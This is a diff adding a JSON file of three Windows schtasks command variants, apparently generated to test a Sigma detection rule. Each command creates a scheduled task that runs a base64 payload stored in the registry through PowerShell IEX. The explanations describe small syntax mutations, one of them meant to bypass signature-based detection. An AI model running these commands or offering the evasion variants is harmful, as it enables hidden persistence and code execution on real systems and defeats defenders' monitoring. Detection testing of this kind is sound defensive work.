@@ -1,0 +1,14 @@
+[
+  {
+    "output": "schtasks.exe /Create /F /TN \"TestTask\" /TR \"powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\TestTask).Payload)))\" /SC MINUTE /MO 30",
+    "explanation": "This command uses the same base64 decoding and registry retrieval method as the Sigma rule but omits unnecessary elements like quotes and spaces for minimal mutation. It still satisfies the detection criteria."
+  },
+  {
+    "output": "schtasks.exe /Create /F /TN \"TestTask\" /TR \"powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((gp HKCU:\\SOFTWARE\\TestTask).Payload)))\" /SC MINUTE /MO 30",
+    "explanation": "This command replaces 'Get-ItemProperty' with its alias 'gp' and uses minimal spacing to bypass potential signature-based detection while maintaining the same behavior."
+  },
+  {
+    "output": "schtasks.exe /Create /F /TN \"TestTask\" /TR \"powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path 'HKCU:\\SOFTWARE\\TestTask').Payload)))\" /SC MINUTE /MO 30",
+    "explanation": "This command uses single quotes around the registry path to slightly alter the syntax while preserving the original behavior and detection criteria."
+  }
+]
